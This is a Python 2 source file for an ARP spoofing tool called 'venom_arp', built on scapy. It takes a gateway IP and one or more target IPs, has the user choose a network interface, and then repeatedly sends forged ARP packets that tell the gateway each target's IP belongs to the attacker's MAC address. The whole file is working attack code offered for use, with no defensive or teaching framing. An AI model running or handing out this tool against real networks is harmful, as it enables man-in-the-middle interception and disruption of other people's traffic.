import color as c
print c.INFO + 'Loading modules...' + c.CLR
import sys
import re
from scapy.all import *
from time import sleep

GATEWAY = None
TARGET = None
IF_IP = None
IF_MAC = None

# ip in format 'xxx.xxx.xxx.xxx'
def ip_next(ip):
    # convert in int
    ip = ip.split('.')
    for i, ip_sec in enumerate(ip):
        ip[i] = int(ip_sec)

    if(ip[3] < 255):
        ip[3] += 1
    elif(ip[2] < 255):
        ip[3] = 1
        ip[2] += 1
    elif(ip[1] < 255):
        ip[3] = 1
        ip[2] = 1
        ip[1] += 1
    elif(ip[0] < 255):
        ip[3] = 1
        ip[2] = 1
        ip[1] = 1
        ip[0] += 1
    
    # convert to str
    for i, ip_sec in enumerate(ip):
        ip[i] = str(ip_sec)

    return '.'.join(ip)
    
def get_range(ip_range):
    ips = []
    
    ip_start = ip_range.split('-')[0]
    ip_end = ip_range.split('-')[1]

    ips.append(ip_start)
   
    while(ips[-1] != ip_end):
        ips.append(ip_next(ips[-1]))

    return ips

def is_ip(ip):
    pattern = '^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$'

    return re.match(pattern, ip)

def check_args():
    global TARGET, GATEWAY

    if(len(sys.argv) == 3):
        if(is_ip(sys.argv[1])):
            GATEWAY = sys.argv[1]

        # target
        for c in sys.argv[2]:
            if(c == '-'):
                TARGET = get_range(sys.argv[2])
                break
            else:
                TARGET = sys.argv[2].split(',')
        for ip in TARGET:
            if(not is_ip(ip)):
                TARGET = None
                break

    return (GATEWAY and TARGET)

def usage():
    print c.ERR + \
'''
Sintaxis error
Usage:
    venom_arp <ip_gateway> (<ip_target> | <ip_list> | <ip_range>)
        <ip_target>: Format xxx.xxx.xxx.xxx
        <ip_list>: Format xxx.xxx.xxx.xxx,xxx.xxx.xxx.xxx,...
        <ip_range>: Format xxx.xxx.xxx.xxx-xxx.xxx.xxx.xxx
'''

def get_mac(ip):
    global GATEWAY
    mac = None
    
    try:
        result = sr(ARP(op=ARP.who_has, pdst=ip), verbose=False, timeout=2)
        mac = result[0][ARP][0][1].hwsrc
    except:
        pass

    return mac

def chose_interface():
    global IF_MAC
    interfaces = get_windows_if_list()

    print c.PROM + 'Avaiable interfaces:'
    
    for index, i in enumerate(interfaces):
        print c.OK + '({index}) {name} - {mac}'.format(
            index = index,
            name = i['name'],
            mac = i['mac'])
    
    while(True):
        option = raw_input(c.PROM + 'Select interface: ')
        if(option.isdigit()):
            option = int(option)
            if(option in range(len(interfaces))):
                break
        print c.ERR + 'Invalid option...' + c.CLR
    
    IF_MAC = interfaces[int(option)]['mac']
        
def run():
    print c.OK + '[*] Staring arp spoofing...'
    try:
        while(True):
            for target in TARGET:
                packet = Ether()/ARP(
                    op=ARP.who_has,
                    hwsrc=IF_MAC,
                    pdst=GATEWAY,
                    psrc=target)
                print '[+] Spoofing to ' + target,
                sendp(packet, verbose=False)
                print '... OK'
            sleep(1)
    except Exception as e:
        print c.ERR + 'A error ocurred while sending packet:'
        print str(e) + c.CLR
################################# main #########################################

def main():
    global TARGET, GATEWAY
# Geting MAC for IP 192.168.1.100 ...
    if(check_args()):
        chose_interface()
        run()
        # TODO: arp poisoning (spoofing)
        # ->

    else:
        usage()
        return -1

if(__name__ == '__main__'):
        main()
